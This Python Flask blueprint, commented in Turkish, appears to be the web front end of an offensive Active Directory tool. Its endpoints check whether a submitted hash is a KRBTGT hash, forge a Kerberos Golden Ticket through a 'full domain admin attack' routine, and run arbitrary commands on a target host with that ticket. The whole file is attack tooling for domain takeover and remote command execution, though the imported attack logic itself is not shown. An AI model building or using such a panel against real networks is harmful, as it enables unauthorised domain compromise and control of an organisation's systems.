from flask import Blueprint, render_template, request, jsonify, redirect, session

from cybermodules.golden_ticket import GoldenTicketAutomation

golden_bp = Blueprint("golden", __name__)


@golden_bp.route("/golden")
def golden_dashboard():
    """Golden Ticket ana sayfası"""
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("golden.html")


@golden_bp.route("/golden/analyze-hash", methods=["POST"])
def analyze_hash():
    """Hash'in KRBTGT olup olmadığını analiz et"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    hash_str = data.get("hash", "")
    
    if not hash_str:
        return jsonify({"success": False, "message": "Hash gerekli"})
    
    gta = GoldenTicketAutomation()
    is_krbtgt = gta.is_krbtgt_hash(hash_str)
    
    return jsonify({
        "success": True,
        "is_krbtgt": is_krbtgt,
        "message": "KRBTGT hash tespit edildi!" if is_krbtgt else "Bu hash KRBTGT değil",
        "recommendation": "Hashdump sonuçlarını kontrol edin" if not is_krbtgt else "Golden Ticket oluşturabilirsiniz"
    })


@golden_bp.route("/golden/forge", methods=["POST"])
def forge_ticket():
    """Golden Ticket oluştur"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    hash_str = data.get("hash", "")
    domain = data.get("domain", "")
    dc_ip = data.get("dc_ip", "")
    domain_sid = data.get("domain_sid", "")
    
    if not hash_str or not domain:
        return jsonify({
            "success": False,
            "message": "Hash ve Domain gerekli"
        })
    
    gta = GoldenTicketAutomation()
    
    # Tam saldırı gerçekleştir
    result = gta.full_domain_admin_attack(
        krbtgt_hash=hash_str,
        domain=domain,
        dc_ip=dc_ip or domain,
        domain_sid=domain_sid or None
    )
    
    return jsonify(result)


@golden_bp.route("/golden/execute", methods=["POST"])
def execute_with_ticket():
    """Ticket ile komut çalıştır"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    target = data.get("target", "")
    command = data.get("command", "whoami")
    ticket_path = data.get("ticket_path", "/tmp/krbtgt.ccache")
    
    if not target:
        return jsonify({"success": False, "message": "Target gerekli"})
    
    gta = GoldenTicketAutomation()
    result = gta.execute_with_ticket(target, ticket_path, command)
    
    return jsonify({
        "success": result["success"],
        "output": result.get("output", ""),
        "error": result.get("error", "")
    })
